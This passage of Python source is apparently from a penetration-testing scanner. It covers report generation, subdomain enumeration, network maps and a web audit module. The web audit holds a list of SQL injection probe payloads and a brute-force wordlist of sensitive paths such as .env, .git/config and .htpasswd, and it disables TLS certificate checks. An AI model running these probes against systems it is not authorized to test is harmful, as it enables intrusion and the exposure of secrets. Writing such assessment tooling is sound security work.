# results.  All CSS/JS is inlined — single file, no dependencies.
# Optionally converts to PDF via wkhtmltopdf or weasyprint if present.
# ═══════════════════════════════════════════════════════════════════

def _severity_badge(severity: str) -> str:
    colours = {
        "CRITICAL": ("dc2626", "ffffff"),
        "HIGH":     ("ea580c", "ffffff"),
        "MEDIUM":   ("d97706", "ffffff"),
        "LOW":      ("16a34a", "ffffff"),
        "INFO":     ("2563eb", "ffffff"),
    }
    bg, fg = colours.get(severity.upper(), ("6b7280", "ffffff"))
    return (f'<span style="background:#{bg};color:#{fg};'
            f'padding:2px 8px;border-radius:4px;font-size:11px;'
            f'font-weight:700;">{severity}</span>')


def export_html_report(results: List["HostResult"],
                        output_path: str,
                        title: str = "PyScanner Pentest Report",
                        use_nvd: bool = False) -> None:
    """
    [ENH-16] Write a self-contained HTML pentest report.

    Includes:
      • Executive summary (open port count, critical service list)
      • Per-host sections with port table, banners, CVEs
      • Per-host attack path analysis (ENH-15)
      • Plugin/vulnerability findings
    """
    import datetime as _dt
    import html as _html

    scan_date = _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    total_open = sum(
        sum(1 for r in hr.ports.values() if r.state == "open")
        for hr in results
    )
    total_cves = 0

    # ── Build per-host HTML ─────────────────────────────────────────
    host_sections = []
    for hr in results:
        open_ports = [r for r in hr.ports.values() if r.state == "open"]
        host_cves: List[CveRecord] = []

        # Port table rows
        port_rows = []
        for r in sorted(open_ports, key=lambda x: x.port):
            vs = _html.escape(r.version or "")
            cves_for_port = run_cve_lookup(r.version or r.service or "",
                                            use_nvd=use_nvd)
            host_cves.extend(cves_for_port)
            cve_html = ""
            if cves_for_port:
                cve_html = "<br>".join(
                    f'{_severity_badge(c.severity)} {_html.escape(c.cve_id)} '
                    f'— {_html.escape(c.description[:80])}'
                    for c in cves_for_port[:3]
                )

            plugin_html = ""
            if r.plugin_results:
                findings = [p for p in r.plugin_results if p.found]
                if findings:
                    plugin_html = "<br>".join(
                        f'🔴 {_html.escape(p.name)}: {_html.escape(p.output[:100])}'
                        for p in findings[:5]
                    )

            port_rows.append(f"""
            <tr>
              <td><strong>{r.port}/{r.protocol}</strong></td>
              <td><span style="color:#16a34a;">●</span> open</td>
              <td>{_html.escape(r.service or "")}</td>
              <td style="font-family:monospace;font-size:12px;">{_html.escape(vs[:60])}</td>
              <td style="font-size:12px;">{cve_html}</td>
              <td style="font-size:12px;">{plugin_html}</td>
            </tr>""")

        total_cves += len(set(c.cve_id for c in host_cves))

        # Attack paths
        attack_paths = analyze_attack_paths(hr)
        ap_html = ""
        if attack_paths:
            ap_items = []
            for ap in attack_paths[:8]:
                impact_col = {"CRITICAL":"dc2626","HIGH":"ea580c",
                               "MEDIUM":"d97706","LOW":"16a34a"}.get(ap.impact,"666")
                steps_html = "".join(
                    f'<li style="margin:2px 0;">{_html.escape(s)}</li>'
                    for s in ap.steps
                )
                ap_items.append(f"""
                <div style="border-left:3px solid #{impact_col};padding:8px 12px;margin:8px 0;background:#fafafa;">
                  <strong style="color:#{impact_col};">[{ap.impact}]</strong>
                  {_html.escape(ap.name)}
                  <span style="color:#666;font-size:11px;">— confidence: {ap.confidence}</span>
                  <ol style="margin:6px 0 0 16px;font-size:12px;">{steps_html}</ol>
                  <div style="font-size:11px;color:#888;margin-top:4px;">
                    Tools: {_html.escape(', '.join(ap.tools))}
                  </div>
                </div>""")
            ap_html = f"""
            <h3 style="color:#1e40af;margin-top:24px;">⚔️ Attack Paths ({len(attack_paths)} identified)</h3>
            {"".join(ap_items)}"""

        host_sections.append(f"""
        <div style="border:1px solid #e5e7eb;border-radius:8px;padding:20px;margin:20px 0;background:#fff;">
          <h2 style="color:#1e3a5f;border-bottom:2px solid #3b82f6;padding-bottom:8px;">
            🖥️ {_html.escape(hr.ip)}
            {f'<span style="font-size:14px;color:#666;margin-left:12px;">({_html.escape(hr.hostname)})</span>' if hr.hostname else ""}
            <span style="font-size:13px;float:right;color:#16a34a;">{hr.status.upper()}</span>
          </h2>
          {'<p><strong>OS:</strong> ' + _html.escape(hr.os_guess or "") + '</p>' if hr.os_guess else ""}
          <h3 style="color:#1e40af;">🔓 Open Ports ({len(open_ports)})</h3>
          <table style="width:100%;border-collapse:collapse;font-size:13px;">
            <thead>
              <tr style="background:#1e3a5f;color:#fff;">
                <th style="padding:8px;text-align:left;">Port</th>
                <th style="padding:8px;text-align:left;">State</th>
                <th style="padding:8px;text-align:left;">Service</th>
                <th style="padding:8px;text-align:left;">Version</th>
                <th style="padding:8px;text-align:left;">CVEs</th>
                <th style="padding:8px;text-align:left;">Findings</th>
              </tr>
            </thead>
            <tbody>{"".join(port_rows)}</tbody>
          </table>
          {ap_html}
        </div>""")

    # ── Executive summary ───────────────────────────────────────────
    exec_summary = f"""
    <div style="background:linear-gradient(135deg,#1e3a5f,#2563eb);color:#fff;
                border-radius:8px;padding:24px;margin-bottom:24px;">
      <h1 style="margin:0 0 8px;font-size:28px;">🔍 {_html.escape(title)}</h1>
      <p style="margin:0;opacity:0.85;">Generated: {scan_date}</p>
    </div>
    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin-bottom:24px;">
      <div style="background:#fff;border:1px solid #e5;border-radius:8px;padding:16px;text-align:center;">
        <div style="font-size:32px;font-weight:700;color:#2563eb;">{len(results)}</div>
        <div style="color:#666;">Hosts Scanned</div>
      </div>
      <div style="background:#fff;border:1px solid #e5;border-radius:8px;padding:16px;text-align:center;">
        <div style="font-size:32px;font-weight:700;color:#16a34a;">{total_open}</div>
        <div style="color:#666;">Open Ports</div>
      </div>
      <div style="background:#fff;border:1px solid #e5;border-radius:8px;padding:16px;text-align:center;">
        <div style="font-size:32px;font-weight:700;color:#dc2626;">{total_cves}</div>
        <div style="color:#666;">CVEs Matched</div>
      </div>
      <div style="background:#fff;border:1px solid #e5;border-radius:8px;padding:16px;text-align:center;">
        <div style="font-size:32px;font-weight:700;color:#ea580c;">
          {sum(len(analyze_attack_paths(hr)) for hr in results)}
        </div>
        <div style="color:#666;">Attack Paths</div>
      </div>
    </div>"""

    # ── Assemble final HTML ─────────────────────────────────────────
    html_doc = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>{_html.escape(title)}</title>
  <style>
    * {{ box-sizing: border-box; }}
    body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
             background: #f3f4f6; margin: 0; padding: 24px; color: #111; }}
    .container {{ max-width: 1200px; margin: 0 auto; }}
    table {{ width: 100%; border-collapse: collapse; }}
    th, td {{ padding: 8px 10px; border: 1px solid #e5e7eb; vertical-align: top; }}
    tr:nth-child(even) {{ background: #f9fafb; }}
    h2 {{ margin-top: 0; }}
    @media print {{ body {{ background: white; padding: 0; }}
                    .container {{ max-width: 100%; }} }}
  </style>
</head>
<body>
<div class="container">
  {exec_summary}
  {"".join(host_sections)}
  <div style="text-align:center;color:#888;font-size:12px;margin-top:32px;padding-top:16px;border-top:1px solid #e5;">
    PyScanner — Professional Network Scanner Report
  </div>
</div>
</body>
</html>"""

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(html_doc)

    # ── Optional PDF conversion ─────────────────────────────────────
    if output_path.endswith(".html"):
        pdf_path = output_path.replace(".html", ".pdf")
        _try_convert_to_pdf(output_path, pdf_path)


def _try_convert_to_pdf(html_path: str, pdf_path: str) -> bool:
    """
    [ENH-16] Try to convert HTML report to PDF.
    Attempts wkhtmltopdf first, then weasyprint, silently skips if neither found.
    """
    import shutil, subprocess
    if shutil.which("wkhtmltopdf"):
        try:
            subprocess.run(
                ["wkhtmltopdf", "--quiet", html_path, pdf_path],
                check=True, timeout=30,
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except Exception:
            pass
    try:
        import weasyprint
        weasyprint.HTML(filename=html_path).write_pdf(pdf_path)
        return True
    except Exception:
        pass
    return False


# ═══════════════════════════════════════════════════════════════════
# [ENH-17] SUBDOMAIN ENUMERATION
# ═══════════════════════════════════════════════════════════════════

# Common subdomain wordlist for built-in enumeration
_SUBDOMAIN_WORDLIST: List[str] = [
    "www", "mail", "ftp", "smtp", "pop", "imap", "webmail", "email",
    "remote", "vpn", "rdp", "ssh", "dev", "staging", "test", "qa",
    "beta", "alpha", "prod", "production", "demo", "portal", "admin",
    "api", "api2", "v1", "v2", "backend", "frontend", "app", "apps",
    "mobile", "m", "static", "cdn", "assets", "media", "img", "images",
    "video", "files", "download", "uploads", "store", "shop", "ecommerce",
    "pay", "payment", "payments", "billing", "invoice", "accounts",
    "auth", "login", "sso", "oauth", "ldap", "directory",
    "db", "database", "mysql", "postgres", "mongo", "redis", "cache",
    "monitor", "metrics", "grafana", "prometheus", "kibana", "elastic",
    "jenkins", "ci", "cd", "git", "gitlab", "github", "bitbucket",
    "jira", "confluence", "wiki", "docs", "documentation", "support",
    "helpdesk", "ticket", "status", "health",
    "ns1", "ns2", "dns", "mx", "relay", "exchange",
    "internal", "intranet", "corp", "extranet", "private",
    "backup", "bak", "old", "new", "legacy", "archive",
    "cloud", "aws", "azure", "gcp",
    "k8s", "kubernetes", "docker", "container",
    "elk", "splunk", "nagios", "zabbix",
]


@dataclass
class SubdomainResult:
    subdomain: str
    ip:        str
    cname:     Optional[str] = None
    status:    str           = "found"   # found / wildcard / error


def enumerate_subdomains(domain: str,
                          wordlist: Optional[List[str]] = None,
                          threads: int = 50,
                          timeout: float = 3.0,
                          check_wildcard: bool = True,
                          ) -> List[SubdomainResult]:
    """
    [ENH-17] Enumerate subdomains of domain via DNS resolution.

    Algorithm:
        1. Optionally detect wildcard DNS (resolve random.domain → any IP)
        2. For each word in wordlist, resolve word.domain
        3. Record A record (IP) and CNAME if present
        4. Filter out wildcard IPs if wildcard detected

    Parameters:
        domain         — base domain (e.g. "example.com")
        wordlist       — custom word list; uses built-in if None
        threads        — parallel resolver threads
        timeout        — DNS resolution timeout per subdomain
        check_wildcard — detect and filter wildcard DNS responses
    """
    if wordlist is None:
        wordlist = _SUBDOMAIN_WORDLIST

    # Wildcard detection
    wildcard_ips: set = set()
    if check_wildcard:
        rand_sub = f"pyscanner-{random.randint(100000,999999)}.{domain}"
        try:
            wc_ip = socket.gethostbyname(rand_sub)
            wildcard_ips.add(wc_ip)
        except socket.gaierror:
            pass   # no wildcard — good

    results: List[SubdomainResult] = []
    lock = __import__('threading').Lock()

    def _resolve_one(word: str) -> None:
        fqdn = f"{word}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            if ip in wildcard_ips:
                return   # wildcard response — skip
            # Try to get CNAME via getaddrinfo
            cname: Optional[str] = None
            try:
                info = socket.getaddrinfo(fqdn, None)
                if info:
                    # Canonical name is in the 4th element if different from fqdn
                    canon = info[0][4][0] if info else None
                    if canon and canon != ip:
                        cname = canon
            except Exception:
                pass
            with lock:
                results.append(SubdomainResult(
                    subdomain=fqdn, ip=ip, cname=cname))
        except socket.gaierror:
            pass
        except socket.timeout:
            pass

    import concurrent.futures as _cf
    with _cf.ThreadPoolExecutor(max_workers=threads) as executor:
        list(executor.map(_resolve_one, wordlist))

    # Sort by subdomain name
    results.sort(key=lambda r: r.subdomain)
    return results


# ═══════════════════════════════════════════════════════════════════
# [ENH-18] WEB AUDIT MODULE  (SQLi detection + directory brute force)
# ═══════════════════════════════════════════════════════════════════

@dataclass
class WebFinding:
    finding_type: str    # sqli / dir / header / info
    url:          str
    detail:       str
    severity:     str    # CRITICAL / HIGH / MEDIUM / LOW / INFO

    def __str__(self) -> str:
        return f"[{self.severity}] {self.finding_type}: {self.url} — {self.detail}"


# Common directory/file list for discovery
_DIR_WORDLIST: List[str] = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "phpmyadmin", "pma", "adminer", "adminer.php",
    "api", "api/v1", "api/v2", "swagger", "swagger-ui", "swagger.json",
    "openapi.json", ".well-known", "robots.txt", "sitemap.xml",
    "config", "configuration", "settings", "setup", "install",
    "backup", "backup.sql", "backup.tar.gz", "db.sql", "dump.sql",
    ".git", ".git/config", ".git/HEAD", ".env", ".env.local",
    ".htaccess", ".htpasswd", "web.config", "web.config.bak",
    "server-status", "server-info",   # Apache
    "nginx_status",                    # nginx
    "jmx-console", "web-console", "jboss",
    "solr", "console", "shell",
    "actuator", "actuator/health", "actuator/env", "actuator/beans",
    "monitor", "metrics", "health", "info",
    "upload", "uploads", "files", "images", "static",
    "phpinfo.php", "info.php", "test.php",
    "old", "bak", "tmp", "temp",
    "secret", "secrets", "private", "internal",
]

# SQL injection test payloads (detection only — no exploitation)
_SQLI_PAYLOADS: List[Tuple[str, str]] = [
    ("'",              "syntax error"),
    ("1 OR 1=1",       "always true"),
    ("1' OR '1'='1",   "string injection"),
    ("\" OR \"1\"=\"1","double quote injection"),
    ("1; SELECT 1",    "stacked query"),
    ("1 AND SLEEP(0)",  "time-based blind"),
    ("1 UNION SELECT NULL", "union probe"),
]

_SQLI_ERROR_PATTERNS = [
    r"you have an error in your sql",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ORA-\d{5}",
    r"PostgreSQL.*error",
    r"PSQLException",
    r"syntax error.*near",
    r"unterminated string",
    r"SQLite.*error",
    r"System\.Data\.SqlClient",
    r"ODBC SQL Server Driver",
    r"mysql_fetch",
    r"pg_query\(\)",
]


def web_audit(base_url: str,
              timeout: float = 5.0,
              threads: int = 20,
              test_sqli: bool = True,
              brute_dirs: bool = True,
              check_headers: bool = True,
              ) -> List[WebFinding]:
    """
    [ENH-18] Lightweight web audit for a given base URL.

    Checks:
      1. HTTP security headers (missing headers → INFO/MEDIUM findings)
      2. Directory/file brute force from _DIR_WORDLIST
      3. SQL injection detection in URL parameters (detection only)

    This is a detection tool, not an exploitation tool.
    All requests use a scanner User-Agent.
    """
    import urllib.request  as _ur
    import urllib.error    as _ue
    import urllib.parse    as _up
    import re              as _re
    import concurrent.futures as _cf

    findings: List[WebFinding] = []
    lock = __import__('threading').Lock()
    ua   = "PyScanner-WebAudit/1.0 (security assessment)"

    def _fetch(url: str, follow: bool = True) -> Optional[Tuple[int, Dict, str]]:
        """Fetch URL → (status_code, headers_dict, body_snippet)."""
        try:
            req = _ur.Request(url, headers={"User-Agent": ua})
            ctx = __import__('ssl').create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = __import__('ssl').CERT_NONE
            with _ur.urlopen(req, timeout=timeout,
                              context=ctx if url.startswith("https") else None) as resp:
                body = resp.read(4096).decode("utf-8", errors="replace")
                return resp.status, dict(resp.headers), body
        except _ue.HTTPError as e:
            return e.code, {}, ""
        except Exception:
            return None

    # ── 1. Security header checks ───────────────────────────────────
    if check_headers:
        res = _fetch(base_url)
        if res:
            status, headers, body = res
            header_keys = {k.lower() for k in headers}
            missing = []
            hdr_checks = {
                "x-frame-options":          "MEDIUM",
                "x-content-type-options":   "LOW",
                "strict-transport-security":"MEDIUM",
                "content-security-policy":  "MEDIUM",
                "x-xss-protection":         "LOW",
                "referrer-policy":          "LOW",
                "permissions-policy":       "LOW",
            }
            for hdr, sev in hdr_checks.items():
                if hdr not in header_keys:
                    with lock:
                        findings.append(WebFinding(
                            "header", base_url,
                            f"Missing {hdr.title()}", sev))

            # Check for sensitive info disclosure
            if "x-powered-by" in header_keys:
                with lock:
                    findings.append(WebFinding(
                        "info", base_url,
                        f"X-Powered-By: {headers.get('x-powered-by','')}", "LOW"))
            if "server" in header_keys:
                with lock:
                    findings.append(WebFinding(
                        "info", base_url,
                        f"Server: {headers.get('server','')}", "INFO"))

    # ── 2. Directory brute force ────────────────────────────────────
    if brute_dirs:
        def _check_dir(path: str) -> None:
            url = base_url.rstrip("/") + "/" + path
            res = _fetch(url)
            if res:
                status, headers, body = res
                if status in (200, 301, 302, 403):
                    sev = "HIGH" if status == 200 else "MEDIUM"
                    # Upgrade severity for sensitive paths
                    if any(s in path for s in [".git", ".env", "backup",
                                                "config", "admin", "phpinfo",
                                                "actuator/env"]):
                        sev = "CRITICAL" if status == 200 else "HIGH"
                    with lock:
                        findings.append(WebFinding(
                            "dir", url,
                            f"HTTP {status} — {path}", sev))

        with _cf.ThreadPoolExecutor(max_workers=threads) as ex:
            list(ex.map(_check_dir, _DIR_WORDLIST))

    # ── 3. SQL injection detection ──────────────────────────────────
    if test_sqli:
        # Parse URL for existing parameters
        parsed = _up.urlparse(base_url)
        params = _up.parse_qs(parsed.query)
        if not params:
            params = {"id": ["1"], "q": ["test"], "search": ["test"]}

        for param_name in list(params.keys())[:3]:   # max 3 params
            for payload, technique in _SQLI_PAYLOADS:
                test_params = dict(params)
                test_params[param_name] = [payload]
                qs  = _up.urlencode(test_params, doseq=True)
                url = _up.urlunparse(parsed._replace(query=qs))
                res = _fetch(url)
                if not res:
                    continue
                status, headers, body = res
                body_lower = body.lower()
                for pattern in _SQLI_ERROR_PATTERNS:
                    if _re.search(pattern, body_lower, _re.IGNORECASE):
                        with lock:
                            findings.append(WebFinding(
                                "sqli", url,
                                f"Possible SQLi via param '{param_name}' "
                                f"[{technique}] — matched: '{pattern}'",
                                "CRITICAL"))
                        break

    # Sort: CRITICAL first
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda f: sev_order.get(f.severity, 9))
    return findings


# ═══════════════════════════════════════════════════════════════════
# [ENH-19] VISUAL NETWORK MAP
# ═══════════════════════════════════════════════════════════════════
#
# Generates three formats from scan results:
#
#   1. ASCII topology tree  (always available, no dependencies)
#   2. Graphviz DOT file    (render with: dot -Tsvg map.dot -o map.svg)
#   3. Standalone HTML/D3.js interactive force-directed graph
#      (self-contained single file, no server needed)
#
# Node colour coding:
#   Red    = CRITICAL CVEs or high-risk services (SMB/RDP/Telnet)
#   Orange = open web/database ports
#   Blue   = SSH / management
#   Green  = low-risk services
#   Grey   = host with no open ports
# ═══════════════════════════════════════════════════════════════════

def _host_risk_color(hr: "HostResult") -> str:
    """Return a risk colour for a host based on its open services."""
    open_ports = {r.port for r in hr.ports.values() if r.state == "open"}
    versions   = " ".join(
        (r.version or r.service or "") for r in hr.ports.values()
        if r.state == "open").lower()
    cves = run_cve_lookup(versions)
    if cves and cves[0].severity == "CRITICAL":
        return "#dc2626"   # red — critical CVE matched
    if open_ports & {445, 3389, 23, 502, 2375, 6379}:
        return "#dc2626"   # red — high-risk service
    if open_ports & {80, 443, 3306, 5432, 27017, 8080}:
        return "#f59e0b"   # orange — web/db
    if open_ports & {22, 5985, 5986}:
        return "#3b82f6"   # blue — management
    if open_ports:
        return "#16a34a"   # green — low-risk open ports
    return "#9ca3af"       # grey — no open ports


def export_ascii_map(results: List["HostResult"],
                     gateway: Optional[str] = None) -> str:
    """
    [ENH-19] Render an ASCII topology tree from scan results.

    Structure:
        Internet
          └── Gateway / Router
                ├── 192.168.1.1   [up]  22/ssh  80/http
                ├── 192.168.1.5   [up]  3306/mysql
                └── 192.168.1.10  [up]  445/smb  ← CRITICAL
    """
    lines: List[str] = []
    lines.append("NETWORK MAP")
    lines.append("═" * 60)
    lines.append("Internet")
    lines.append("  │")

    gw_label = f"Gateway ({gateway})" if gateway else "Gateway / Router"
    lines.append(f"  └── {gw_label}")

    up_hosts = [hr for hr in results if hr.status == "up"]
    for i, hr in enumerate(up_hosts):
        connector = "└──" if i == len(up_hosts) - 1 else "├──"
        open_ports = sorted(
            [(r.port, r.service) for r in hr.ports.values()
             if r.state == "open"],
            key=lambda x: x[0])
        port_summary = "  ".join(
            f"{p}/{s}" for p, s in open_ports[:6]) if open_ports else "(no open ports)"

        # Risk tag
        cves = run_cve_lookup(
            " ".join((r.version or r.service or "") for r in hr.ports.values()
                     if r.state == "open"))
        risk_tag = ""
        if cves:
            risk_tag = f"  ← {cves[0].severity}: {cves[0].cve_id}"
        elif any(r.port in {445, 3389, 23, 2375, 6379}
                 for r in hr.ports.values() if r.state == "open"):
            risk_tag = "  ← HIGH RISK SERVICE"

        hostname = f" ({hr.hostname})" if hr.hostname else ""
        os_tag   = f" [{hr.os_guess}]" if hr.os_guess else ""
        lines.append(f"        {connector} {hr.ip}{hostname}{os_tag}")
        lines.append(f"              {port_summary}{risk_tag}")

    lines.append("")
    lines.append(f"Total hosts: {len(up_hosts)} up / {len(results)} scanned")
    return "\n".join(lines)


def export_graphviz_map(results: List["HostResult"],
                         output_path: str,
                         gateway: Optional[str] = None,
                         render_svg: bool = True) -> str:
    """
    [ENH-19] Write a Graphviz DOT file and optionally render to SVG.

    Returns the DOT source as a string.
    Renders SVG if graphviz `dot` binary is found on PATH.
    """
    import shutil as _shutil, subprocess as _sub

    lines: List[str] = [
        'digraph PyScanner {',
        '  graph [rankdir=TB fontname="Arial" bgcolor="#f8fafc"];',
        '  node  [fontname="Arial" fontsize=11 style=filled];',
        '  edge  [color="#94a3b8" arrowsize=0.6];',
        '',
        '  internet [label="Internet" shape=cloud '
        'fillcolor="#e0f2fe" color="#0284c7"];',
    ]

    gw_id    = "gateway"
    gw_label = gateway or "Router/Gateway"
    lines.append(f'  {gw_id} [label="{gw_label}\\n(gateway)" '
                 f'shape=diamond fillcolor="#fef3c7" color="#d97706"];')
    lines.append(f'  internet -> {gw_id};')
    lines.append('')

    for hr in results:
        if hr.status != "up":
            continue
        nid    = "h_" + hr.ip.replace(".", "_")
        color  = _host_risk_color(hr)
        open_p = sorted(r.port for r in hr.ports.values() if r.state == "open")
        port_s = "\\n".join(
            f"{p}/{service_name(p)}" for p in open_p[:8])
        label  = f"{hr.ip}"
        if hr.hostname:
            label += f"\\n{hr.hostname}"
        if port_s:
            label += f"\\n{port_s}"
        shape  = "box" if open_p else "ellipse"
        lines.append(f'  {nid} [label="{label}" shape={shape} '
                     f'fillcolor="{color}" fontcolor="white" color="{color}"];')
        lines.append(f'  {gw_id} -> {nid};')

    lines.append('}')
    dot_src = "\n".join(lines)

    with open(output_path, "w") as f:
        f.write(dot_src)

    # Try to render SVG
    if render_svg and _shutil.which("dot"):
        svg_path = output_path.replace(".dot", ".svg")
        try:
            _sub.run(["dot", "-Tsvg", output_path, "-o", svg_path],
                     check=True, timeout=30,
                     stdout=_sub.DEVNULL, stderr=_sub.DEVNULL)
        except Exception:
            pass

    return dot_src


def export_d3_map(results: List["HostResult"],
                   output_path: str,
                   gateway: Optional[str] = None) -> None:
    """
    [ENH-19] Write a self-contained interactive D3.js force-directed
    network map as a standalone HTML file.

    No server required — open in any browser.
    Nodes are colour-coded by risk.  Click a node for port details.
    """
    import json as _json, html as _html

    nodes = []
    links = []

    # Root node
    nodes.append({"id": "internet", "label": "Internet",
                  "color": "#0284c7", "shape": "cloud", "ports": ""})
    gw_label = gateway or "Gateway"
    nodes.append({"id": "gateway", "label": gw_label,
                  "color": "#d97706", "shape": "diamond", "ports": ""})
    links.append({"source": "internet", "target": "gateway"})

    for hr in results:
        if hr.status != "up":
            continue
        nid = "h_" + hr.ip.replace(".", "_")
        open_p = sorted(
            [(r.port, r.service or service_name(r.port))
             for r in hr.ports.values() if r.state == "open"],
            key=lambda x: x[0])
        port_detail = "\n".join(f"{p}/{s}" for p, s in open_p[:12])
        label = hr.ip + (f"\n{hr.hostname}" if hr.hostname else "")
        nodes.append({
            "id":    nid,
            "label": label,
            "color": _host_risk_color(hr),
            "shape": "rect",
            "ports": port_detail,
            "ip":    hr.ip,
        })
        links.append({"source": "gateway", "target": nid})

    nodes_json = _json.dumps(nodes)
    links_json = _json.dumps(links)

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PyScanner Network Map</title>
  <style>
    body {{ margin:0; background:#0f172a; font-family:Arial,sans-serif; color:#e2e8f0; }}
    #info {{ position:fixed; top:16px; left:16px; background:#1e293b;
             border:1px solid #334155; border-radius:8px; padding:16px;
             min-width:220px; max-width:320px; font-size:13px; }}
    #info h3 {{ margin:0 0 8px; color:#60a5fa; font-size:15px; }}
    #info pre {{ margin:4px 0; white-space:pre-wrap; font-size:12px;
                 color:#94a3b8; font-family:monospace; }}
    .legend {{ position:fixed; bottom:16px; left:16px; background:#1e293b;
               border:1px solid #334155; border-radius:8px; padding:12px;
               font-size:12px; }}
    .dot {{ display:inline-block; width:10px; height:10px;
            border-radius:50%; margin-right:6px; }}
    svg {{ width:100vw; height:100vh; }}
    .node {{ cursor:pointer; }}
    .node text {{ font-size:10px; fill:#e2e8f0; pointer-events:none; }}
    .link {{ stroke:#334155; stroke-opacity:0.7; }}
    .node:hover circle, .node:hover rect {{ stroke:#f1f5f9; stroke-width:2; }}
  </style>
</head>
<body>
<div id="info">
  <h3>📡 Node Details</h3>
  <div id="node-ip" style="color:#60a5fa;font-weight:700;">Click a node</div>
  <pre id="node-ports">—</pre>
</div>
<div class="legend">
  <div><span class="dot" style="background:#dc2626"></span>Critical / High-risk</div>
  <div><span class="dot" style="background:#f59e0b"></span>Web / Database</div>
  <div><span class="dot" style="background:#3b82f6"></span>Management (SSH)</div>
  <div><span class="dot" style="background:#16a34a"></span>Open (low risk)</div>
  <div><span class="dot" style="background:#9ca3af"></span>No open ports</div>
</div>
<svg id="svg"></svg>
<script>
// Inline minimal D3-style force simulation (no CDN dependency)
const nodes = {nodes_json};
const links = {links_json};

const svg   = document.getElementById('svg');
const W = window.innerWidth, H = window.innerHeight;
svg.setAttribute('viewBox', `0 0 ${{W}} ${{H}}`);

// Simple spring-based layout
nodes.forEach((n,i) => {{
  const angle = (i / nodes.length) * 2 * Math.PI;
  n.x = W/2 + 320 * Math.cos(angle);
  n.y = H/2 + 260 * Math.sin(angle);
  n.vx = 0; n.vy = 0;
}});
nodes[0].x = W/2; nodes[0].y = 80; // internet at top
nodes[1].x = W/2; nodes[1].y = 200; // gateway below

const nodeById = Object.fromEntries(nodes.map(n => [n.id, n]));
links.forEach(l => {{
  l.s = nodeById[l.source]; l.t = nodeById[l.target];
}});

function tick() {{
  // Repulsion
  for (let i = 0; i < nodes.length; i++)
    for (let j = i+1; j < nodes.length; j++) {{
      const dx = nodes[i].x - nodes[j].x, dy = nodes[i].y - nodes[j].y;
      const d  = Math.sqrt(dx*dx + dy*dy) || 1;
      const f  = 2400 / (d*d);
      nodes[i].vx += f*dx/d; nodes[i].vy += f*dy/d;
      nodes[j].vx -= f*dx/d; nodes[j].vy -= f*dy/d;
    }}
  // Spring attraction
  links.forEach(l => {{
    const dx = l.t.x - l.s.x, dy = l.t.y - l.s.y;
    const d  = Math.sqrt(dx*dx + dy*dy) || 1;
    const f  = (d - 140) * 0.04;
    l.s.vx += f*dx/d; l.s.vy += f*dy/d;
    l.t.vx -= f*dx/d; l.t.vy -= f*dy/d;
  }});
  // Damping + boundary
  nodes.forEach(n => {{
    if (n.id === 'internet') return;
    n.x += n.vx *= 0.7;
    n.y += n.vy *= 0.7;
    n.x = Math.max(40, Math.min(W-40, n.x));
    n.y = Math.max(40, Math.min(H-40, n.y));
  }});
  render();
}}

function render() {{
  svg.innerHTML = '';
  // Edges
  links.forEach(l => {{
    const line = document.createElementNS('http://www.w3.org/2000/svg','line');
    line.setAttribute('x1',l.s.x); line.setAttribute('y1',l.s.y);
    line.setAttribute('x2',l.t.x); line.setAttribute('y2',l.t.y);
    line.setAttribute('stroke','#334155'); line.setAttribute('stroke-width','1.5');
    svg.appendChild(line);
  }});
  // Nodes
  nodes.forEach(n => {{
    const g = document.createElementNS('http://www.w3.org/2000/svg','g');
    g.setAttribute('class','node');
    g.style.cursor = 'pointer';
    let shape;
    if (n.shape === 'cloud' || n.shape === 'diamond') {{
      shape = document.createElementNS('http://www.w3.org/2000/svg','circle');
      shape.setAttribute('r', n.shape==='cloud'?28:22);
      shape.setAttribute('fill', n.color);
      shape.setAttribute('stroke','#1e293b'); shape.setAttribute('stroke-width','2');
    }} else {{
      shape = document.createElementNS('http://www.w3.org/2000/svg','rect');
      shape.setAttribute('x',-36); shape.setAttribute('y',-16);
      shape.setAttribute('width',72); shape.setAttribute('height',32);
      shape.setAttribute('rx',6); shape.setAttribute('fill',n.color);
      shape.setAttribute('stroke','#1e293b'); shape.setAttribute('stroke-width','2');
    }}
    g.appendChild(shape);
    const txt = document.createElementNS('http://www.w3.org/2000/svg','text');
    txt.setAttribute('text-anchor','middle');
    txt.setAttribute('dy','4');
    txt.setAttribute('fill','white');
    txt.setAttribute('font-size','10');
    txt.setAttribute('font-family','Arial');
    txt.textContent = n.label.split('\\n')[0];
    g.appendChild(txt);
    g.setAttribute('transform',`translate(${{Math.round(n.x)}},${{Math.round(n.y)}})`);
    g.addEventListener('click', () => {{
      document.getElementById('node-ip').textContent = n.label.replace(/\\n/g,' — ');
      document.getElementById('node-ports').textContent = n.ports || '(no open ports)';
    }});
    svg.appendChild(g);
  }});
}}

let steps = 0;
function animate() {{
  if (steps++ < 200) {{ tick(); requestAnimationFrame(animate); }}
  else render();
}}
animate();
</script>
</body>
</html>"""

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(html_content)


# ═══════════════════════════════════════════════════════════════════
# [ENH-20] AUTONOMOUS SCANNER MODE
# ═══════════════════════════════════════════════════════════════════
#
# Implements automated multi-phase pentesting logic:
#
#   Phase 1 — Discovery:   fast SYN sweep of top ports
#   Phase 2 — Deep scan:   full port range on live hosts
#   Phase 3 — Detection:   service probes + banner grabbing
#   Phase 4 — Fingerprint: OS detection on interesting hosts
#   Phase 5 — Vuln check:  plugin suite on open ports
#   Phase 6 — Web audit:   web_audit() on HTTP/HTTPS ports
#   Phase 7 — CVE match:   run_cve_lookup() on all banners
#   Phase 8 — Attack paths:analyze_attack_paths() on each host
#   Phase 9 — Subdomain:   enumerate_subdomains() if domain given
#   Phase 10 — Report:     export_html_report() + visual map
#
# The engine decides which phases to run based on what it finds.
